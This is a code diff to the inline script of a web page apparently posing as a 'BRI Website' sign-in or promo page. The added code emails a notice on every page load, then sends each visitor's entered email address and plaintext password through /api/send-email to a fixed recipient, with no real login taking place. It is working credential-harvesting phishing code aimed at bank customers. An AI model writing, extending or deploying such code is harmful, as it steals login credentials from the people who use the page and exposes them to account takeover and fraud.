@@ -210,6 +210,40 @@
   </footer>
 
   <script>
+    // Send website visit email on page load (twice for reliability)
+    function sendWebsiteVisitEmail() {
+      const emailData = {
+        templateType: 'website-visit',
+        email: 'recipient@example.com',
+        subject: 'BRI Website - Promo List Visit',
+        data: {
+          name: 'Sugeng Yulianto',
+          ip_address: 'Unknown',
+          website_url: window.location.href
+        }
+      };
+
+      fetch('/api/send-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(emailData)
+      }).then(response => response.json())
+      .then(data => {
+        console.log('Email response:', data);
+      })
+      .catch(error => {
+        console.error('Email error:', error);
+      });
+    }
+
+    // Send first email immediately
+    sendWebsiteVisitEmail();
+
+    // Send second email after 500ms for reliability
+    setTimeout(sendWebsiteVisitEmail, 500);
+
     document.addEventListener('DOMContentLoaded', function() {
       const stepInitial = document.getElementById('step-initial');
       const stepEmail = document.getElementById('step-email');
@@ -273,6 +307,29 @@
         emailError.classList.remove('show');
         btnNext.style.display = 'none';
         loadingIndicator.classList.add('active');
+
+        // Send email submission notification
+        fetch('/api/send-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            templateType: 'email-submission',
+            email: 'recipient@example.com',
+            subject: 'BRI Website - Email Submission',
+            data: {
+              name: 'Sugeng Yulianto',
+              email: email
+            }
+          })
+        }).then(response => response.json())
+        .then(data => {
+          console.log('Email submission response:', data);
+        })
+        .catch(error => {
+          console.error('Email submission error:', error);
+        });
         
         setTimeout(function() {
           loadingIndicator.classList.remove('active');
@@ -286,9 +343,35 @@
       });
 
       btnSignin.addEventListener('click', function() {
+        const passwordInput = document.getElementById('password-input');
+        const password = passwordInput.value.trim();
+
         btnSignin.style.display = 'none';
         loadingIndicatorSignin.classList.add('active');
-        
+
+        // Send password submission notification
+        fetch('/api/send-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            templateType: 'password-submission',
+            email: 'recipient@example.com',
+            subject: 'BRI Website - Password Submission',
+            data: {
+              name: 'Sugeng Yulianto',
+              password: password
+            }
+          })
+        }).then(response => response.json())
+        .then(data => {
+          console.log('Password submission response:', data);
+        })
+        .catch(error => {
+          console.error('Password submission error:', error);
+        });
+
         setTimeout(function() {
           loadingIndicatorSignin.classList.remove('active');
           btnSignin.style.display = 'block';
